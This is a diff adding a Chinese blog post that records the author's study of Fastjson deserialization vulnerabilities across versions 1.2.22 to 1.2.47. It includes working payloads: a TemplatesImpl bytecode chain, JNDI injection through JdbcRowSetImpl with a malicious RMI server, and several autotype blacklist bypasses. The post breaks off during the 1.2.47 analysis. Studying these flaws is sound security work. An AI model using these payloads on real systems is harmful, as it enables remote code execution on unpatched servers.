@@ -188,6 +188,1106 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/../images/avatar.PNG">
+      <meta itemprop="name" content="blueSatchel">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="blueSatchel's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/06/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">fastjson反序列化漏洞学习记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-06 21:14:23" itemprop="dateCreated datePublished" datetime="2022-06-06T21:14:23+08:00">2022-06-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-06-14 19:46:05" itemprop="dateModified" datetime="2022-06-14T19:46:05+08:00">2022-06-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/06/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/06/06/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Fastjson是阿里开发的一个Java库, 提供了将 Java 对象转换为其 JSON 格式、 JSON 字符串转换为等效</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Fastjson提供了autotype功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型，Fastjson自定义的反序列化机制会调用指定类中的setter方法及部分getter方法，当组件开启了autotype功能并且反序列化不可信数据时（后边即使不开也没用，除非启用safemode），攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有gadget，则会造成一些严重的安全问题。</p>
+<p>例子</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">POC</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">POC</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造方法调用&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">POC</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getCmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;get调用&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCmd</span><span class="params">(String cmd)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;set调用&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.cmd = cmd;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line"><span class="comment">//1.2.22 - 1.2.24</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        POC poc = <span class="keyword">new</span> POC(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        String s = JSON.toJSONString(poc);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.test.POC\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220606212042046.png" alt="image-20220606212042046"></p>
+<p>可以看到,序列化的时候调用了get,反序列化的时候调用了无参构造方法,set和get方法</p>
+<h2 id="漏洞历史分析"><a href="#漏洞历史分析" class="headerlink" title="漏洞历史分析"></a>漏洞历史分析</h2><h3 id="1-2-22-1-2-24"><a href="#1-2-22-1-2-24" class="headerlink" title="1.2.22 - 1.2.24"></a>1.2.22 - 1.2.24</h3><p>跟着源码调试了一下,大体流程就是对字符串做语法分析,拆分开,并且对每个属性用fieldInfo进行存储,最后使用反射调用它对应的set方法,这个set方法名是字符串拼接的,不难让人想到TemplatesImpl这个类,这个类有一个<code>getOutputProperties()</code>方法</p>
+<p>但是有个问题就是这个类中的所有属性都是私有属性,需要添加<code>Feature.SupportNonPublicField</code>字段才能通过<code>JSON.parseObject</code>进行字符串到对象的转换过程</p>
+<h4 id="TemplatesImpl调用链"><a href="#TemplatesImpl调用链" class="headerlink" title="TemplatesImpl调用链"></a>TemplatesImpl调用链</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl.getOutputProperties()</span><br><span class="line">   TemplatesImpl.newTransformer()</span><br><span class="line">      TemplatesImpl.getTransletInstance()</span><br><span class="line">         TemplatesImpl.defineTransletClasses()</span><br><span class="line">            ClassLoader.defineClass()</span><br><span class="line">               Class.newInstance()</span><br></pre></td></tr></table></figure>
+
+<p>最主要的地方就是构造TemplatesImpl类中的<code>_bytecode</code>属性</p>
+<p>这个地方可以使用反射构造继承了<code>AbstractTranslet</code>的恶意类来执行代码</p>
+<p>恶意代码可以添加在恶意类的静态代码块在类加载的时候执行或者添加到它的构造方法中在实例化的时候调用</p>
+<p>学习一下使用<code>javassist</code>这个工具来生成一个类并修改代码生成字节码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastJson</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;  </span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass evil = pool.get(evil.class.getName());</span><br><span class="line">        String cmd = <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;</span><br><span class="line">        evil.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">        evil.setName(randomClassName);</span><br><span class="line">        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] evilCode = evil.toBytecode();</span><br><span class="line">        String evilCode_base64 = Base64.encodeBase64String(evilCode);</span><br><span class="line">        <span class="keyword">final</span> String Template = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String payload =</span><br><span class="line">                <span class="string">&quot;&#123;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;@type\&quot;:\&quot;&quot;</span> + Template + <span class="string">&quot;\&quot;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#x27;_name&#x27;:&#x27;asd&#x27;,&#x27;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_tfactory&#x27;:&#123; &#125;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> + <span class="string">&quot;\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        Object obj = JSON.parseObject(payload, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="为什么类需要是public的"><a href="#为什么类需要是public的" class="headerlink" title="为什么类需要是public的"></a>为什么类需要是public的</h5><p>值得一提的是这里的恶意类必须是public的,否则在<code>TemplatesImpl</code>类中的<code>getTransletInstance</code>方法中会无法获取该类的实例</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607213128139.png" alt="image-20220607213128139"></p>
+<p>根本原因在<code>Class.newInstance</code>的调用链这里</p>
+<p>按理说我定义的类的包和它就是一致的呀,明明代码都写在一个包下面,但是根据调试发现,javassist生成的class它是不带包名的</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607221426566.png" alt="image-20220607221426566"></p>
+<p>所以这个判断的地方输出false,而只有它的修饰符是public才能进入下面的代码并且返回true最后实现实例化</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607220335886.png" alt="image-20220607220335886"></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607220315641.png" alt="image-20220607220315641"></p>
+<p>这里对于利用条件是有要求的，Fastjson默认只会反序列化public属性，而outputProperties和_bytecodes由private修饰，所以受害端的parseObject必须设置Feature.portNonPublicField，而Feature.portNonPublicField在1.22才被引入，所以这条利用链条件过于苛刻</p>
+<h4 id="JdbcRowSetImpl调用链"><a href="#JdbcRowSetImpl调用链" class="headerlink" title="JdbcRowSetImpl调用链"></a>JdbcRowSetImpl调用链</h4><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220608005810266.png" alt="image-20220608005810266"></p>
+<p>在<code>JdbcRowSetImpl#connect</code>方法中调用了参数名可控的<code>InitialContext.lookup()</code>方法</p>
+<p>这里有一个基础知识点,就是子类虽然可以继承父类的private属性,但是<strong>必须通过父类中定义的get和set才能访问到</strong></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220608005043003.png" alt="image-20220608005043003"></p>
+<p>共有三处调用了<code>connect()</code>方法</p>
+<p>里面第三个<code>setAutoCommit</code>方法对应的参数<code>autoCommit</code>同时拥有get方法,可以使用fastjson还原类的时候调用set方法的特性从而调用到<code>lookup</code></p>
+<p>编写恶意服务端</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//第一个参数随便填</span></span><br><span class="line">        Reference reference=<span class="keyword">new</span> Reference(<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;evil&quot;</span>,<span class="string">&quot;http://127.0.0.1:5555/&quot;</span>);</span><br><span class="line">        <span class="comment">//这里末尾要加个/,否则无法读取.....</span></span><br><span class="line">        <span class="comment">//将该reference封装成远程对象</span></span><br><span class="line">        ReferenceWrapper referenceWrapper=<span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(<span class="string">&quot;hello&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>开启http服务并将静态代码块有恶意代码的恶意类放上去</p>
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220608011811781.png" alt="image-20220608011811781" style="zoom:67%;" />
+
+<p>exp</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-2-25-1-2-41"><a href="#1-2-25-1-2-41" class="headerlink" title="1.2.25-1.2.41"></a>1.2.25-1.2.41</h3><p>1.2.25开始引入了 checkAutoType 安全机制，默认关闭的情况下不能反序列化类，开启后对反序列化类进行黑名单检测，所以1.2.25~1.2.24的关键就在于<strong>针对开启了Autotype的Fastjson进行黑名单绕过</strong></p>
+<p>黑名单的实现在<code>com.alibaba.fastjson.parser.ParserConfig</code>的<code>denyList</code>属性中</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220607234636647.png" alt="image-20220607234636647"></p>
+<h5 id="checkAutoType函数分析"><a href="#checkAutoType函数分析" class="headerlink" title="checkAutoType函数分析"></a>checkAutoType函数分析</h5><p>如果能直接添加到白名单中也就不需要下面的绕过了</p>
+<p>首先需要打开autoType才能进行对不在白名单中的类型进行转换</p>
+<p>其中一种方便调试的最简单的方式是设置全局<code>ParserConfig</code>的<code>AutoTypeSupport</code>为true</p>
+<p>开启之后让autoTypeSupport为true才能有机会进去这段代码</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220609204549908.png" alt="image-20220609204549908"></p>
+<p>在这段代码中判断,如果在白名单<code>acceptList</code>中则调用<code>TypeUtils.loadClass</code>,不在白名单里面进入下面是否在黑名单中的判断,如果不在黑名单才能接着往下走</p>
+<p>直到源码的861行,调用<code>TypeUtils.loadClass</code>去加载类</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610152821158.png" alt="image-20220610152821158"></p>
+<p>这个loadClass方法会将以L开头和;结尾的类名去除L和;再去递归调用加载</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610152802367.png" alt="image-20220610152802367"></p>
+<p>这里涉及到一个叫做JNI字段描述符的东西</p>
+<p>JNI全称是(Java Native Interface)</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_37537867/article/details/124137225">https://blog.csdn.net/m0_37537867/article/details/124137225</a></p>
+<p>它提供一种Java字节码调用c/c++的解决方案</p>
+<p>由于Java支持函数重载，因此仅仅根据函数名是没法找到对应的JNI函数。为了解决这个问题，JNI将参数类型和返回值类型作为函数的签名信息。</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610162925861.png" alt="image-20220610162925861"></p>
+<p><strong>JNI常用的数据类型及对应字符</strong></p>
+<table>
+<thead>
+<tr>
+<th>Java 类型</th>
+<th>符号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Boolean</td>
+<td>Z</td>
+</tr>
+<tr>
+<td>Byte</td>
+<td>B</td>
+</tr>
+<tr>
+<td>Char</td>
+<td>C</td>
+</tr>
+<tr>
+<td>Short</td>
+<td>S</td>
+</tr>
+<tr>
+<td>Int</td>
+<td>I</td>
+</tr>
+<tr>
+<td>Long</td>
+<td>J</td>
+</tr>
+<tr>
+<td>Float</td>
+<td>F</td>
+</tr>
+<tr>
+<td>Double</td>
+<td>D</td>
+</tr>
+<tr>
+<td>Void</td>
+<td>V</td>
+</tr>
+<tr>
+<td>objects对象</td>
+<td>以”<code>L</code>“开头，以”<code>;</code>“结尾，中间是用”<code>/</code>“ 隔开的包及类名。比如：<code>Ljava/lang/String;</code>如果是嵌套类，则用<code>$</code>来表示嵌套。例如 “<code>(Ljava/lang/String;Landroid/os/FileUtils$FileStatus;)Z</code>”</td>
+</tr>
+</tbody></table>
+<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>综合以上条件,需要开启autoTypeSupport并且将类名进行简单改造,给类名添加<code>L</code>和<code>;</code>包裹</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="lt-1-2-42"><a href="#lt-1-2-42" class="headerlink" title="&lt;=1.2.42"></a>&lt;=1.2.42</h3><p>1.2.42版本将黑名单进行了hash处理</p>
+<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610190544304.png" alt="image-20220610190544304" style="zoom:80%;" />
+
+<p>在checkAutoType函数中</p>
+<p>先进行一次判断并截取掉了L和;</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610223234128.png" alt="image-20220610223234128"></p>
+<p>接下来的代码就是之前检查黑白名单的hash版</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610223337297.png" alt="image-20220610223337297"></p>
+<p>到loadClass这里还是递归调用</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610223441375.png" alt="image-20220610223441375"></p>
+<p>综上所述,可以使用双写L和;的方式绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/hello\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="lt-1-2-43"><a href="#lt-1-2-43" class="headerlink" title="&lt;=1.2.43"></a>&lt;=1.2.43</h3><p>该版本对于双写LL的payload进行了判断和限制</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220610231237572.png" alt="image-20220610231237572"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">JSON.parseObject(&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[&#123;,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="keyword">true</span>&#125;<span class="string">&quot;);</span></span><br></pre></td></tr></table></figure>
+
+<p>但是可以通过添加<code>[</code>和<code>[&#123;</code>的方式来进行绕过,添加<code>[</code>可以理解,但是添加<code>[&#123;</code>还不甚了解</p>
+<p>原因是为了让这个地方的token=14从而绕过数组转换抛出异常</p>
+<p>关于fastjson中token的解析<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45854465/article/details/120626835">https://blog.csdn.net/qq_45854465/article/details/120626835</a></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220611160647239.png" alt="image-20220611160647239"></p>
+<h3 id="lt-1-2-45"><a href="#lt-1-2-45" class="headerlink" title="&lt;=1.2.45"></a>&lt;=1.2.45</h3><p>出现了新的利用类直接绕过了黑名单限制<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code></p>
+<blockquote>
+<p>但是mybatis版本必须小于3.5.6</p>
+</blockquote>
+<p>该类中的<code>setProperties()</code>方法存在Jndi注入的问题</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220611174720213.png" alt="image-20220611174720213"></p>
+<p>新建一个LDAP服务,并且将远程对象引用绑定上去</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220611170739137.png" alt="image-20220611170739137"></p>
+<p>写段代码测试一下</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220611174751726.png" alt="image-20220611174751726"></p>
+<p>利用fastjson构造</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">JSON.parseObject(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://localhost:10389/cn=test,dc=example,dc=com\&quot;&#125;&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="lt-1-2-47-—-无需AutoTypeSupport"><a href="#lt-1-2-47-—-无需AutoTypeSupport" class="headerlink" title="&lt;=1.2.47   —(无需AutoTypeSupport)"></a><strong>&lt;=1.2.47</strong>   —(无需AutoTypeSupport)</h3><p>这个版本之前的漏洞都必须要在开启 AutoTypeSupport 的情况下才能利用。由于fastjson会将一些基本类型的类对象提前放到mappings中缓存，通过类缓存机制可以绕过黑白名单检测该版本中，通过利用类缓存机制（通过java.lang.Class类提前带入恶意类并缓存到 TypeUtils.mappings 中），可以在不开启 AutoTypeSupport 的情况下进行反序列化的利用。（漏洞点在 checkAutoType 中）</p>
+<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JSON.parseObject(<span class="string">&quot;[&#123;&quot;</span><span class="meta">@type</span><span class="string">&quot;:&quot;</span>java.lang.Class<span class="string">&quot;,&quot;</span>val<span class="string">&quot;:&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="string">&quot;&#125;,&#123;&quot;</span><span class="meta">@type</span><span class="string">&quot;:&quot;</span>com.sun.rowset.JdbcRowSetImpl<span class="string">&quot;,&quot;</span>dataSourceName<span class="string">&quot;:&quot;</span>ldap:<span class="comment">//localhost:10389/cn=test,dc=example,dc=com&quot;,&quot;autoCommit&quot;:true&#125;]&quot;);</span></span><br></pre></td></tr></table></figure>
+
+<p>默认使用的是<code>DefaultJSONParser.parser</code></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614181358097.png" alt="image-20220614181358097"></p>
+<p>使用lexer这个词法分析器检测到<code>@type</code>之后,会调用<code>checkAutoType</code></p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614181943820.png" alt="image-20220614181943820"></p>
+<p>主要的点还是在<code>checkAutoType</code>中</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614185549671.png" alt="image-20220614185549671"></p>
+<p>经过前面对poc的基础判断之后,会进入<code>deserializers.findClass</code>,这里实际上是去一个桶里面找有没有对应的类,如果类名equal则返回这个类</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614183113141.png" alt="image-20220614183113141"></p>
+<p>桶里面存了一堆类</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/image-20220614185937978.png" alt="image-20220614185937978"></p>
+<p>获取到java.long.Class类之后会返回到</p>
+<p>DefaultJSONParser中继续执行</p>
+<p>获取到<code>MiscCodec</code>这个类之后,调用<code>deserialize</code>方法</p>
